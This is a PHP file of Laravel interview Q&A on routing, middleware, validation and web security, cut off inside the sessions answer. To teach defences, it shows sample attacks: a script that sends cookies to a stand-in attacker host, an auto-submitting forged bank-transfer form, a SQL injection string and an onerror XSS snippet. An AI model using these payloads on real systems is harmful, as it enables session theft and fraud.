<?php

// Laravel 5-year interview series, part 2 (Q26–Q50): routing, controllers, middleware, validation, security.
// Answers are in depth: how it works, a production example, common mistakes and the interview answer.
$q = [];

$q[] = ['question' => 'Q26. What is routing in Laravel?', 'answer' => <<<'TXT'
Routing decides which code runs for an incoming HTTP request. Laravel matches the request's method and URL against the routes registered in routes/web.php and routes/api.php, in the order they were defined, and calls the first match.

```
Route::get('/products', [ProductController::class, 'index']);      // GET /products -> ProductController@index
Route::post('/products', [ProductController::class, 'store']);
Route::put('/products/{product}', [ProductController::class, 'update']);
Route::patch('/products/{product}', [ProductController::class, 'update']);
Route::delete('/products/{product}', [ProductController::class, 'destroy']);
```

HTTP methods communicate intent, and browsers, proxies and caches rely on them:

```
GET     retrieve; safe and idempotent; may be cached
POST    create or trigger an action; not idempotent (two POSTs can create two orders)
PUT     replace a resource completely; idempotent
PATCH   change part of a resource
DELETE  remove a resource; idempotent
```

E-commerce example: a GET must never change data. If "add to cart" were a GET link, a browser prefetching links or a search-engine crawler could fill carts. Changes always go through POST/PUT/PATCH/DELETE, which also get CSRF protection in web routes.

Route parameters and constraints:

```
Route::get('/orders/{order}', [OrderController::class, 'show'])->whereNumber('order');
Route::get('/blog/{slug}', [BlogController::class, 'show'])->where('slug', '[a-z0-9-]+');
Route::get('/reports/{year?}', [ReportController::class, 'yearly']);   // optional parameter
```

Fallback and redirects:

```
Route::redirect('/shop', '/products', 301);
Route::fallback(fn () => response()->view('errors.404', [], 404));
```

Performance in production: php artisan route:cache compiles all routes into one file so Laravel does not rebuild the route table on every request. Closure routes cannot be cached, which is one reason production apps use controller routes.

Common mistakes: defining /products/{product} before /products/export (the second never matches because "export" is treated as a product id), and using GET for actions that change state.

Interview answer: "Routing maps an HTTP method and URI to a controller action. I keep routes thin, use the correct verbs, constrain parameters, group shared middleware and prefixes, name every route, and cache routes in production."
TXT];

$q[] = ['question' => 'Q27. What is route model binding?', 'answer' => <<<'TXT'
Route model binding turns a route parameter into an Eloquent model automatically. Instead of looking up the record yourself, you type-hint the model and Laravel fetches it, returning 404 if it does not exist.

Without binding:

```
Route::get('/products/{id}', function ($id) {
    $product = Product::findOrFail($id);
    return $product;
});
```

With implicit binding (the parameter name must match the variable name):

```
Route::get('/products/{product}', function (Product $product) {
    return $product;
});

// /products/10  ->  SELECT * FROM products WHERE id = 10 LIMIT 1  ->  Product model, or 404
```

In a controller:

```
public function show(Product $product)
{
    return new ProductResource($product);
}
```

Scoped bindings are important for security in multi-tenant systems. Banking example: a customer may only open statements of their own account.

```
Route::get('/accounts/{account}/statements/{statement}', [StatementController::class, 'show'])
    ->scopeBindings();

// Laravel resolves the statement through the account:
// $account->statements()->where('id', $statementId)->firstOrFail()
// so /accounts/1/statements/999 returns 404 if statement 999 belongs to account 2.
```

Scoping prevents one class of bug (mixing parent and child ids) but it is not authorization: you still check that the logged-in user owns the account with a policy.

Soft-deleted models are excluded by default; use ->withTrashed() on the route when an admin screen must open deleted records.

Interview answer: "Route model binding resolves models from route parameters, keeps controllers short and returns 404 automatically. For nested resources I use scoped bindings, and I still authorize access with policies."
TXT];

$q[] = ['question' => 'Q28. Implicit vs explicit route model binding?', 'answer' => <<<'TXT'
Implicit binding works by convention: the route parameter name matches a type-hinted model variable.

```
Route::get('/users/{user}', [UserController::class, 'show']);

public function show(User $user) { return $user; }   // {user} -> User $user
```

Explicit binding registers the resolution yourself, normally in a service provider's boot() method. Use it when the parameter name does not match a model, or when resolving needs custom logic.

```
// AppServiceProvider::boot()
Route::model('member', User::class);                 // {member} resolves to User

Route::bind('order', function (string $value) {      // custom lookup: order number instead of id
    return Order::where('order_number', $value)->firstOrFail();
});
```

E-commerce example: customers see /orders/ORD-2026-000187 instead of /orders/187, so internal ids are not exposed and order numbers cannot be guessed by counting.

Payment example with stricter rules: only resolve payments that are not archived.

```
Route::bind('payment', fn (string $value) => Payment::query()
    ->where('reference', $value)
    ->whereNull('archived_at')
    ->firstOrFail());
```

When to use which: implicit binding for the normal "id or slug" case; explicit binding when the lookup column, scope or extra conditions differ. For "use slug instead of id" you usually do not need explicit binding at all (see Q29).

Interview answer: "Implicit binding is convention-based and covers most cases. I use explicit binding with Route::bind when the URL identifier is not the primary key or the lookup needs extra conditions."
TXT];

$q[] = ['question' => 'Q29. What is custom route key binding?', 'answer' => <<<'TXT'
By default binding searches by the primary key (id). You can change the column either for the whole model or for a single route.

For the whole model:

```
class Product extends Model
{
    public function getRouteKeyName(): string
    {
        return 'slug';
    }
}

// /products/samsung-galaxy-s25  ->  WHERE slug = 'samsung-galaxy-s25'
```

For one route only (Laravel 7+):

```
Route::get('/products/{product:slug}', [ProductController::class, 'show']);
Route::get('/admin/products/{product}', [AdminProductController::class, 'edit']);   // still by id
```

Generating URLs uses the same key automatically: route('products.show', $product) produces /products/samsung-galaxy-s25.

Why it matters in production:
- SEO: readable URLs rank better and are shareable.
- Security: sequential ids reveal business volume (order 1001, 1002…) and invite enumeration.
- Stability: slugs survive data migrations where ids change.

Requirements: the column must be unique and indexed, otherwise every request does a full table scan and two products could match.

```
$table->string('slug')->unique();
```

Slug changes break old links. A common pattern stores old slugs and redirects them with 301.

Interview answer: "I override getRouteKeyName or use {model:column} in the route, make the column unique and indexed, and keep ids out of public URLs."
TXT];

$q[] = ['question' => 'Q30. What are named routes?', 'answer' => <<<'TXT'
A named route gives a URL a stable identifier so the rest of the application never hardcodes paths.

```
Route::get('/products', [ProductController::class, 'index'])->name('products.index');
Route::get('/products/{product}', [ProductController::class, 'show'])->name('products.show');

route('products.index');                       // http://site.test/products
route('products.show', $product);              // http://site.test/products/samsung-a35
route('products.index', ['sort' => 'price']);  // extra keys become the query string ?sort=price
redirect()->route('orders.show', $order);
```

Why: when marketing renames /products to /catalog, you change one route definition; every link, redirect, email and test that uses route('products.index') keeps working.

Checking where you are (navigation highlighting):

```
@if(request()->routeIs('products.*')) class="active" @endif
```

Signed URLs build on names. Banking example: an emailed link to download a statement that expires after 30 minutes and cannot be tampered with.

```
$url = URL::temporarySignedRoute('statements.download', now()->addMinutes(30), ['statement' => $statement]);

Route::get('/statements/{statement}/download', [StatementController::class, 'download'])
    ->name('statements.download')->middleware('signed');
```

Naming convention: resource.action (orders.index, orders.store), and group prefixes such as admin. for admin routes. php artisan route:list shows every name.

Interview answer: "I name every route and generate URLs with route(). It decouples code from URL structure, enables routeIs() checks and signed URLs."
TXT];

$q[] = ['question' => 'Q31. What are route groups?', 'answer' => <<<'TXT'
Route groups apply shared settings (middleware, URL prefix, name prefix, controller, domain) to many routes at once, so each route does not repeat them.

```
Route::middleware(['auth', 'verified'])->group(function () {
    Route::get('/dashboard', DashboardController::class)->name('dashboard');
    Route::get('/orders', [OrderController::class, 'index'])->name('orders.index');
});

Route::prefix('admin')->name('admin.')->middleware(['auth', 'can:access-admin'])->group(function () {
    Route::get('/users', [Admin\UserController::class, 'index'])->name('users.index');   // /admin/users, admin.users.index
    Route::get('/orders', [Admin\OrderController::class, 'index'])->name('orders.index');
});

Route::controller(PaymentController::class)->prefix('payments')->name('payments.')->group(function () {
    Route::post('/', 'store')->name('store');
    Route::post('/{payment}/refund', 'refund')->name('refund');
});
```

Nested groups merge settings: middleware accumulates, prefixes join, names concatenate.

Banking example with layered protection:

```
Route::prefix('banking')->middleware(['auth:sanctum', 'throttle:banking'])->group(function () {
    Route::get('/accounts', [AccountController::class, 'index']);
    Route::middleware('two-factor')->group(function () {
        Route::post('/transfers', [TransferController::class, 'store']);         // money movement needs 2FA too
        Route::post('/beneficiaries', [BeneficiaryController::class, 'store']);
    });
});
```

Subdomain routing for multi-tenant SaaS:

```
Route::domain('{tenant}.shop.test')->group(function () { ... });
```

Common mistake: putting one sensitive route outside the protected group by accident. php artisan route:list -v shows the middleware actually applied to each route; review it before every release.

Interview answer: "Groups centralise middleware, prefixes and names. I nest them to layer protection, for example auth for all banking routes and an extra two-factor middleware for transfers."
TXT];

$q[] = ['question' => 'Q32. What is resource routing?', 'answer' => <<<'TXT'
Route::resource registers the seven conventional CRUD routes for a controller in one line.

```
Route::resource('products', ProductController::class);
```

```
Method      URI                       Action    Route name
GET         /products                 index     products.index
GET         /products/create          create    products.create
POST        /products                 store     products.store
GET         /products/{product}       show      products.show
GET         /products/{product}/edit  edit      products.edit
PUT/PATCH   /products/{product}       update    products.update
DELETE      /products/{product}       destroy   products.destroy
```

APIs do not need the HTML form pages:

```
Route::apiResource('orders', OrderController::class);                // index, store, show, update, destroy
Route::resource('photos', PhotoController::class)->only(['index', 'show']);
Route::resource('payments', PaymentController::class)->except(['destroy']);   // payments are never deleted
```

Nested and shallow resources:

```
Route::resource('orders.items', OrderItemController::class)->shallow();
// index/store: /orders/{order}/items   show/update/destroy: /items/{item}
```

Generate a matching controller with php artisan make:controller ProductController --resource --model=Product.

Non-CRUD actions get their own route next to the resource (define it before the resource so {product} does not swallow it):

```
Route::post('/orders/{order}/cancel', CancelOrderController::class)->name('orders.cancel');
Route::apiResource('orders', OrderController::class);
```

Payment design note: financial records are corrected with reversal or refund transactions, never with DELETE, so ->except(['destroy']) documents that rule in the routes.

Interview answer: "Resource routes give consistent RESTful URLs and names. I use apiResource for APIs, only/except to remove actions that must not exist, and separate routes or invokable controllers for domain actions like cancel or refund."
TXT];

$q[] = ['question' => 'Q33. What is a single-action (invokable) controller?', 'answer' => <<<'TXT'
A single-action controller handles exactly one operation through __invoke(). It suits business operations that are bigger than CRUD and deserve their own class.

```
php artisan make:controller ProcessPaymentController --invokable

class ProcessPaymentController extends Controller
{
    public function __construct(private PaymentService $payments) {}

    public function __invoke(ProcessPaymentRequest $request, Order $order)
    {
        $this->authorize('pay', $order);

        $payment = $this->payments->charge($order, $request->validated('method'), $request->header('Idempotency-Key'));

        return new PaymentResource($payment);
    }
}

Route::post('/orders/{order}/pay', ProcessPaymentController::class)->name('orders.pay');
```

Why teams use them:
- Each class has one reason to change, so a 1,500-line PaymentController with create/refund/cancel/capture/webhook does not happen.
- Dependencies are specific: the refund controller injects RefundService only.
- Files are easy to find: app/Http/Controllers/Payments/RefundPaymentController.php.
- Tests target one action.

Banking examples: TransferFundsController, BlockCardController, DownloadStatementController. E-commerce: ApplyCouponController, CheckoutController.

Keep the controller thin either way: validate (Form Request), authorize (policy), call a service or action class, return a response. Business rules live in the service so the same logic runs from a queue job or console command.

Interview answer: "For operations that are not simple CRUD I use invokable controllers. Each one validates, authorizes and delegates to a service, which keeps controllers small and logic reusable."
TXT];

$q[] = ['question' => 'Q34. What is middleware priority and order?', 'answer' => <<<'TXT'
Middleware runs as an onion: each layer runs code before passing the request inward with $next($request), and can run code after the response comes back out. The order therefore matters.

```
Request
  -> EncryptCookies -> StartSession -> Authenticate -> SubstituteBindings -> Authorize -> Controller
  <- (response travels back out through the same layers in reverse)
```

Why order matters, with real failures:
- Authorization before authentication: auth()->user() is null, so the check fails or, worse, a careless check passes.
- Route model binding before authentication: an anonymous user gets 404 vs 403 differences that reveal whether a record exists.
- Logging before the request id middleware: logs lack the correlation id.

Where order is defined:
- The global middleware list and middleware groups (web, api) in the HTTP kernel (app/Http/Kernel.php in Laravel 9/10, bootstrap/app.php in 11+).
- $middlewarePriority forces a relative order for specific middleware no matter how routes list them.

```
// Laravel 9/10: app/Http/Kernel.php
protected $middlewarePriority = [
    \Illuminate\Session\Middleware\StartSession::class,
    \App\Http\Middleware\Authenticate::class,
    \Illuminate\Routing\Middleware\SubstituteBindings::class,
    \Illuminate\Auth\Middleware\Authorize::class,
];
```

Payment API example of a deliberate order:

```
Route::middleware(['auth:sanctum', 'throttle:payments', 'idempotency'])->post('/payments', ...);
// 1. know who the caller is  2. rate-limit per user  3. return the stored response for a repeated Idempotency-Key
```

Terminable middleware runs after the response is sent (terminate method), useful for metrics without slowing the user.

Debugging: php artisan route:list -v shows the exact middleware for each route.

Interview answer: "Middleware is an ordered pipeline. Authentication must precede authorization and binding-dependent checks; I control it with groups and middlewarePriority and verify with route:list."
TXT];

$q[] = ['question' => 'Q35. How do you create custom middleware?', 'answer' => <<<'TXT'
```
php artisan make:middleware EnsureActiveSubscription

class EnsureActiveSubscription
{
    public function handle(Request $request, Closure $next, string $plan = 'premium'): Response
    {
        $user = $request->user();

        if (! $user || ! $user->subscription?->allows($plan)) {
            return $request->expectsJson()
                ? response()->json(['success' => false, 'message' => 'An active ' . $plan . ' plan is required.'], 402)
                : redirect()->route('billing.plans')->with('error', 'Upgrade to use this feature.');
        }

        return $next($request);
    }
}
```

Register an alias (Laravel 9/10 in $routeMiddleware or $middlewareAliases; Laravel 11 in bootstrap/app.php), then use it with parameters:

```
'subscribed' => \App\Http\Middleware\EnsureActiveSubscription::class,

Route::middleware('subscribed:enterprise')->group(function () {
    Route::get('/reports/export', ExportReportController::class);
});
```

Real middleware a payments team writes:

```
// Idempotency: a retried POST with the same key returns the first result instead of charging twice
public function handle(Request $request, Closure $next): Response
{
    $key = $request->header('Idempotency-Key');
    if (! $key) return response()->json(['message' => 'Idempotency-Key header is required.'], 400);

    $cacheKey = 'idem:' . $request->user()->id . ':' . $key;
    if ($saved = Cache::get($cacheKey)) return response()->json($saved['body'], $saved['status']);

    $response = $next($request);
    if ($response->isSuccessful()) {
        Cache::put($cacheKey, ['body' => $response->getData(true), 'status' => $response->getStatusCode()], now()->addDay());
    }
    return $response;
}
```

Other common examples: forcing JSON responses on API routes, adding security headers, setting the locale from a header, logging a request id, maintenance windows for a single module.

Rules: middleware should be fast and generic; anything that needs a specific model is usually a policy instead (see Q45).

Interview answer: "I generate middleware, implement handle with $next, return early to block, accept parameters for flexibility and register an alias. Typical ones I have written are idempotency, subscription checks and security headers."
TXT];

$q[] = ['question' => 'Q36. What is Form Request validation?', 'answer' => <<<'TXT'
A Form Request is a dedicated class that holds the authorization check and validation rules for one request. Laravel runs it before the controller method; if validation fails the controller never executes.

```
php artisan make:request StoreOrderRequest

class StoreOrderRequest extends FormRequest
{
    public function authorize(): bool
    {
        return $this->user()->can('create', Order::class);
    }

    public function rules(): array
    {
        return [
            'shipping_address_id' => ['required', Rule::exists('addresses', 'id')->where('user_id', $this->user()->id)],
            'items' => ['required', 'array', 'min:1', 'max:50'],
            'items.*.product_id' => ['required', 'integer', 'exists:products,id'],
            'items.*.quantity' => ['required', 'integer', 'min:1', 'max:10'],
            'coupon' => ['nullable', 'string', 'max:30'],
        ];
    }

    public function messages(): array
    {
        return ['items.min' => 'Your cart is empty.'];
    }

    protected function prepareForValidation(): void
    {
        $this->merge(['coupon' => $this->coupon ? strtoupper(trim($this->coupon)) : null]);
    }
}
```

Controller:

```
public function store(StoreOrderRequest $request, OrderService $orders)
{
    $order = $orders->place($request->user(), $request->validated());
    return (new OrderResource($order))->response()->setStatusCode(201);
}
```

What happens on failure: for browser requests Laravel redirects back with errors and old input; for JSON requests it returns 422 with an errors object.

Why it is better than validating in the controller:
- The controller shows business flow only.
- Rules are reusable and unit-testable.
- authorize() keeps permission checks next to the input they protect.
- Notice the address rule: it validates that the address belongs to this user, a security check, not just a format check.

Advanced hooks: withValidator() for cross-field rules, after() (Laravel 10+), and passedValidation() to normalise data.

Interview answer: "Form Requests hold authorization and validation, run before the controller, return 422 or redirect automatically, and keep controllers clean. I also use them to validate ownership, not just format."
TXT];

$q[] = ['question' => 'Q37. What does $request->validated() return?', 'answer' => <<<'TXT'
validated() returns only the fields that have validation rules and passed them. Anything the client sent without a rule is dropped.

```
// Client sends
{ "name": "Samsung A35", "price": 30000, "is_admin": true, "discount_percent": 100 }

// rules(): name, price only
$data = $request->validated();
// ['name' => 'Samsung A35', 'price' => 30000]   is_admin and discount_percent are gone
```

This is defence in depth against mass assignment: even if a model accidentally has is_admin in $fillable, it cannot arrive through validated data.

Useful variants:

```
$request->validated('price');                 // one key
$request->safe()->only(['name', 'price']);    // subset of validated data
$request->safe()->except(['password']);
$request->safe()->merge(['user_id' => $request->user()->id]);   // add server-side values
```

Important: values you must trust (owner id, price, status) should come from the server, not the request. E-commerce example: never accept the order total from the client.

```
$order = Order::create([
    ...$request->safe()->only(['shipping_address_id', 'coupon']),
    'user_id' => $request->user()->id,
    'total' => $pricing->totalFor($request->validated('items')),   // computed, never trusted
    'status' => 'pending',
]);
```

Interview answer: "validated() returns only rule-checked input. I build models from it, add trusted values like user_id and totals on the server, and never pass $request->all() to create()."
TXT];

$q[] = ['question' => 'Q38. $request->all() vs only() vs validated()?', 'answer' => <<<'TXT'
```
$request->all();                     // every input field, including ones you never expected
$request->only(['name', 'email']);   // just these keys, but NOT validated
$request->except(['password']);      // everything except these
$request->input('address.city');     // one value, dot notation for nested arrays
$request->validated();               // only fields that passed the Form Request rules
```

Differences that matter in production:

```
                 Filters keys   Checks values   Safe for create()/update()
all()            no             no              no
only()           yes            no              only with separate validation
validated()      yes            yes             yes
```

Example of why only() is not enough: only(['email', 'role']) keeps the keys, but a user can still send role=admin. Validation with Rule::in(['customer', 'seller']) is what stops it.

When all() is acceptable: logging a sanitised copy of a webhook payload, or passing input to a search filter object that whitelists keys itself.

Banking example: a transfer endpoint takes from_account, to_account and amount. With all(), an attacker could add fee=0 or status=approved if the code later does Transfer::create($request->all()). With validated() those keys never reach the model.

Interview answer: "all() is everything, only() filters keys but not values, validated() is filtered and checked. For writes I use validated() plus server-side values."
TXT];

$q[] = ['question' => 'Q39. How do you validate unique email addresses (create and update)?', 'answer' => <<<'TXT'
Registration:

```
'email' => ['required', 'email:rfc,dns', 'max:190', 'unique:users,email'],
```

Updating a profile, ignore the current user's own row, otherwise saving the profile unchanged fails with "email already taken":

```
'email' => ['required', 'email', Rule::unique('users', 'email')->ignore($this->user()->id)],
```

Extra conditions, for example a soft-deleted user should not block reuse, or uniqueness per tenant:

```
Rule::unique('users', 'email')->whereNull('deleted_at');
Rule::unique('employees', 'email')->where('company_id', $this->user()->company_id);
```

Case and spacing: "Sachin@Gmail.com " and "sachin@gmail.com" are the same mailbox. Normalise before validating:

```
protected function prepareForValidation(): void
{
    $this->merge(['email' => mb_strtolower(trim((string) $this->email))]);
}
```

Validation alone is not enough under concurrency. Two registration requests can both pass the unique check before either inserts. Always add a database unique index and handle the duplicate-key error:

```
$table->string('email')->unique();

try {
    $user = User::create($data);
} catch (UniqueConstraintViolationException $e) {   // Laravel 10.33+; earlier: QueryException with code 23000
    throw ValidationException::withMessages(['email' => 'This email is already registered.']);
}
```

Interview answer: "unique rule for create, Rule::unique()->ignore() for update, normalise case first, and a unique index in the database because validation alone has a race condition."
TXT];

$q[] = ['question' => 'Q40. How do you validate and store file uploads safely?', 'answer' => <<<'TXT'
```
$request->validate([
    'photo' => ['required', 'file', 'image', 'mimes:jpg,jpeg,png,webp', 'max:2048', 'dimensions:max_width=4000,max_height=4000'],
    'invoice' => ['nullable', 'file', 'mimes:pdf', 'max:5120'],
]);

$path = $request->file('photo')->store('products', 'public');     // random file name, e.g. products/8fJ2...k.webp
$product->update(['image_path' => $path]);
```

How Laravel checks: mimes/image inspect the file content (MIME detection), not just the extension the user chose. max is in kilobytes.

Security rules for production:
- Never use the client's original file name as the stored name (path traversal, overwriting, ../../). store() generates a random name.
- Store private documents (KYC, invoices, salary slips) on a non-public disk and serve them through a controller that authorizes the user, or with temporary signed URLs on S3.
- Make sure uploaded files can never execute: the upload folder must not run PHP. An attacker renaming shell.php to shell.jpg is stopped by MIME validation plus a non-executable location.
- Limit size at every layer: Laravel rule, PHP upload_max_filesize/post_max_size, and the web server.
- Re-encode images (for example with Intervention Image) to strip metadata and embedded payloads; scan documents with antivirus for regulated industries.

Banking KYC example:

```
$path = $request->file('pan_card')->store('kyc/' . $user->id, 'private');

Route::get('/kyc/{document}', function (KycDocument $document) {
    Gate::authorize('view', $document);
    return Storage::disk('private')->download($document->path);
})->middleware('auth');
```

Large files (videos, bulk CSV) should be uploaded directly to object storage with pre-signed URLs, and processed by a queued job.

Interview answer: "Validate type by content and size, store under random names, keep sensitive files private behind authorization, ensure the folder cannot execute code, and process heavy files asynchronously."
TXT];

$q[] = ['question' => 'Q41. What is CSRF and how does Laravel protect against it?', 'answer' => <<<'TXT'
CSRF (Cross-Site Request Forgery) tricks a logged-in user's browser into sending a request they did not intend. Browsers attach cookies automatically, so the server sees a valid session.

Attack example: you are logged in to bank.com. You open evil.com, which contains:

```
<form action="https://bank.com/transfer" method="POST" id="f">
    <input name="to_account" value="ATTACKER">
    <input name="amount" value="50000">
</form>
<script>document.getElementById('f').submit()</script>
```

Without protection, bank.com receives a POST with your session cookie and transfers money.

Laravel's defence: every session has a secret CSRF token. Forms must send it back, and the VerifyCsrfToken middleware (web group) rejects POST/PUT/PATCH/DELETE requests whose token does not match, with a 419 error. evil.com cannot read the token because of the browser's same-origin policy.

```
<form method="POST" action="/transfer">
    @csrf
    ...
</form>
```

AJAX: send the token in a header.

```
<meta name="csrf-token" content="{{ csrf_token() }}">

fetch('/cart', { method: 'POST', headers: { 'X-CSRF-TOKEN': document.querySelector('meta[name=csrf-token]').content } });
```

Exclusions: third-party webhooks (Razorpay, Stripe) cannot send your token, so they are excluded from CSRF and protected by verifying the provider's signature instead.

```
protected $except = ['webhooks/razorpay'];    // then verify X-Razorpay-Signature in the controller
```

Extra layers: SameSite=Lax cookies (Laravel's default) block most cross-site POSTs; never change state with GET.

Token APIs: stateless APIs authenticated by a bearer token in the Authorization header are not vulnerable in the same way, because browsers do not attach that header automatically. SPAs using Sanctum cookie authentication still need CSRF (Sanctum's /sanctum/csrf-cookie flow).

Interview answer: "CSRF abuses automatic cookies. Laravel checks a per-session token on state-changing web requests; I include @csrf or the header, exclude only signed webhooks, and keep SameSite cookies."
TXT];

$q[] = ['question' => 'Q42. What is XSS and how does Laravel protect against it?', 'answer' => <<<'TXT'
XSS (Cross-Site Scripting) happens when user-supplied text is placed into a page as HTML, so the browser runs an attacker's script in your site's context. The script can read the page, send requests as the user, or steal tokens stored in JavaScript.

```
Product review text: <script>fetch('https://evil.example/steal?c='+document.cookie)</script>
```

Blade escapes by default:

```
{{ $review->body }}    // outputs &lt;script&gt;... as harmless text
{!! $review->body !!}  // outputs raw HTML; only for content you sanitised or fully trust
```

Where escaping is not enough:
- Inside JavaScript: use @json($data) or Js::from($data), not "{{ }}" inside a script tag.
- URLs: validate that user-provided links start with http:// or https:// (javascript: links run code).
- Attributes: always quote them; Blade escaping covers quotes inside {{ }}.

Rich text (blog posts, product descriptions edited by sellers) must be sanitised on save with an allow-list library such as HTMLPurifier, then printed with {!! !!}.

Defence in depth:
- HttpOnly session cookies (Laravel default) so scripts cannot read them.
- A Content-Security-Policy header that blocks inline scripts from unknown sources.
- In React or Vue the framework escapes too; dangerouslySetInnerHTML and v-html are the equivalent of {!! !!}.

E-commerce example: a seller's product title "<img src=x onerror=alert(1)>" shows as text in {{ $product->title }}, but would execute in an admin panel that used {!! !!}. Admin screens are high-value targets because admins have more power.

Interview answer: "Blade's {{ }} escapes output; I avoid {!! !!} except for sanitised HTML, use @json in scripts, validate URLs, and add HttpOnly cookies and a CSP."
TXT];

$q[] = ['question' => 'Q43. What is SQL injection and how does Laravel prevent it?', 'answer' => <<<'TXT'
SQL injection happens when input is concatenated into a SQL string, so the input changes the query itself.

```
// Vulnerable
$email = $request->input('email');          // attacker sends: ' OR '1'='1
DB::select("SELECT * FROM users WHERE email = '$email'");
// SELECT * FROM users WHERE email = '' OR '1'='1'   -> returns every user
```

Laravel's Query Builder and Eloquent use prepared statements with parameter binding: the SQL and the values travel separately, so a value can never become SQL.

```
User::where('email', $email)->first();
DB::table('users')->where('email', $email)->first();
DB::select('SELECT * FROM users WHERE email = ?', [$email]);
DB::select('SELECT * FROM users WHERE email = :email', ['email' => $email]);
```

Places where you can still be vulnerable:
- Raw expressions with interpolation: whereRaw("price > $min"). Use whereRaw('price > ?', [$min]).
- Column and table names cannot be bound. Sorting by a user-chosen column must use an allow-list:

```
$sort = in_array($request->sort, ['price', 'created_at', 'rating'], true) ? $request->sort : 'created_at';
$direction = $request->direction === 'asc' ? 'asc' : 'desc';
Product::orderBy($sort, $direction)->paginate(20);
```

- LIKE searches: binding stops injection, but escape % and _ if they must be literal.

Least privilege: the application's database user should not have DROP or GRANT rights, so even a successful injection does less damage.

Banking example: a statement filter ?from=2026-01-01&to=2026-03-31 must be validated as dates (date rule) and bound, never inserted into a raw string.

Interview answer: "Eloquent and the Query Builder bind parameters. I avoid interpolation in raw SQL, bind values with ?, and allow-list column names for sorting."
TXT];

$q[] = ['question' => 'Q44. Authentication vs authorization?', 'answer' => <<<'TXT'
Authentication answers "who are you?". Authorization answers "what are you allowed to do?". Authentication always comes first.

```
Login with email + password + OTP   ->  authenticated as user #42 (Sachin)
Sachin opens invoice #900           ->  authorized?  only if invoice #900 belongs to his company and his role may view invoices
```

Laravel pieces:

```
Authentication: guards (session for web, sanctum/passport tokens for APIs), Auth::attempt(), auth middleware
Authorization:  Gates and Policies, $this->authorize(), can middleware, @can in Blade
```

HTTP responses differ:

```
401 Unauthenticated   no valid identity -> log in
403 Forbidden         identity known, permission missing
404 Not Found         also used deliberately to hide that a record exists
```

Banking example:
- Authentication: customer logs in to net banking with password + OTP. A session or token now identifies them.
- Authorization: they may view their own accounts, transfer up to their daily limit, but not approve loans. A branch manager (different role) may approve loans up to Rs 25 lakh; above that needs a regional manager.

```
// AccountPolicy
public function view(User $user, Account $account): bool
{
    return $account->customer_id === $user->customer_id;
}

// TransferPolicy
public function create(User $user, Account $from, Money $amount): bool
{
    return $from->customer_id === $user->customer_id && $amount->lte($user->dailyTransferRemaining());
}
```

Common mistake: checking only authentication on APIs, so any logged-in user can read any record by changing the id in the URL (IDOR, Insecure Direct Object Reference). Every route that takes an id needs an authorization check.

Interview answer: "Authentication establishes identity with guards; authorization decides permissions with gates and policies. I return 401 vs 403 correctly and authorize every record access to prevent IDOR."
TXT];

$q[] = ['question' => 'Q45. What are Laravel Gates and Policies?', 'answer' => <<<'TXT'
Both answer "may this user do this?". Gates are closures for general abilities; Policies are classes that group permissions for one model.

Gate (application-wide abilities):

```
// AuthServiceProvider::boot()
Gate::define('access-admin', fn (User $user) => $user->hasRole('admin'));
Gate::define('export-reports', fn (User $user) => $user->hasAnyRole(['admin', 'finance']));

Gate::before(fn (User $user) => $user->isSuperAdmin() ? true : null);   // super admin bypass

if (Gate::denies('export-reports')) abort(403);
Route::get('/admin', ...)->middleware('can:access-admin');
```

Policy (model permissions):

```
php artisan make:policy OrderPolicy --model=Order

class OrderPolicy
{
    public function view(User $user, Order $order): bool
    {
        return $order->user_id === $user->id || $user->hasRole('support');
    }

    public function cancel(User $user, Order $order): Response
    {
        if ($order->user_id !== $user->id) return Response::denyAsNotFound();
        return $order->status === 'placed'
            ? Response::allow()
            : Response::deny('Orders can be cancelled only before dispatch.');
    }
}
```

Using them:

```
$this->authorize('cancel', $order);              // controller
$request->user()->can('view', $order);           // anywhere
@can('cancel', $order) <button>Cancel</button> @endcan   // Blade: hide the button
Route::post('/orders/{order}/cancel', ...)->can('cancel', 'order');
```

Hiding a button is only UX; the server-side check is the real protection.

Gates vs Policies:

```
Gates                                    Policies
General abilities (access-admin)          Actions on a model (view/update/cancel order)
Closures in a provider                    One class per model, auto-discovered
Good for a few checks                     Scales to many models and actions
```

Interview answer: "Gates for app-wide abilities, policies for model actions. I authorize in controllers or routes, use Response::deny with clear messages or denyAsNotFound to hide records, and treat @can as UX only."
TXT];

$q[] = ['question' => "Q46. What is Laravel's session system?", 'answer' => <<<'TXT'
HTTP is stateless: each request arrives with no memory of the previous one. A session stores data on the server and links it to a browser through a cookie containing only a random session id.

```
Browser                         Server
  cookie: laravel_session=Abc   ->  look up session Abc in storage  ->  ['user_id' => 42, 'cart_id' => 9]
```

API:

```
session(['cart_id' => 123]);                 // write
$cartId = session('cart_id');                // read
$request->session()->put('step', 2);
$request->session()->forget('step');
$request->session()->flash('status', 'Order placed!');   // available on the next request only
session()->regenerate();                     // new id after login (prevents session fixation)
session()->invalidate();                     // destroy on logout
```

E-commerce example: a guest builds a cart (stored in the session), then logs in. You merge the session cart into the database cart, then regenerate the session id.

Banking security settings (config/session.php):

```
'lifetime' => 10,            // minutes of inactivity before logout
'expire_on_close' => true,
'secure' => true,            // cookie only over HTTPS
'http_only' => true,         // JavaScript cannot read it
'same_site' => 'strict',     // never sent on cross-site requests
'encrypt' => true,           // session payload encrypted at rest
```

What not to store: large objects (sessions are read on every request), passwords, card numbers. Store ids and look data up.

Sessions vs tokens: browser apps use sessions; mobile apps and third-party API clients use tokens (Sanctum/Passport/JWT) because they do not manage cookies the same way.

Interview answer: "Sessions keep per-user state across stateless HTTP using a session id cookie. I regenerate on login, invalidate on logout, keep payloads small and lock cookies down with secure, HttpOnly and SameSite."
TXT];

$q[] = ['question' => 'Q47. What are Laravel session drivers and which should you use?', 'answer' => <<<'TXT'
The driver decides where session data lives (SESSION_DRIVER in .env):

```
file        storage/framework/sessions; default, fine for one server
cookie      whole payload in an encrypted cookie; no server storage, 4 KB limit
database    sessions table; shared across servers, easy to inspect
redis       in-memory, very fast, shared; the usual production choice at scale
memcached   in-memory, shared
array       tests only, not persisted
```

Why it matters when you scale out:

```
Load balancer -> Server 1 (file session for Abc lives here)
              -> Server 2 (no file for Abc)  => user appears logged out
```

Fixes: a shared store (Redis or database) or sticky sessions on the load balancer. Shared storage is preferred because sticky sessions break when a server is removed.

Setup examples:

```
php artisan session:table && php artisan migrate     # database driver
SESSION_DRIVER=redis                                  # with REDIS_HOST configured
```

Choosing for real systems:
- Small site on one server or shared hosting: file.
- Several app servers: redis (fast) or database (simple).
- Banking: Redis or database with short lifetimes, encryption on, and the ability to delete a user's sessions on password change or suspicious activity. With the database driver you can do DB::table('sessions')->where('user_id', $id)->delete().

Also note: queue workers and scheduled commands have no session; never rely on session() inside jobs.
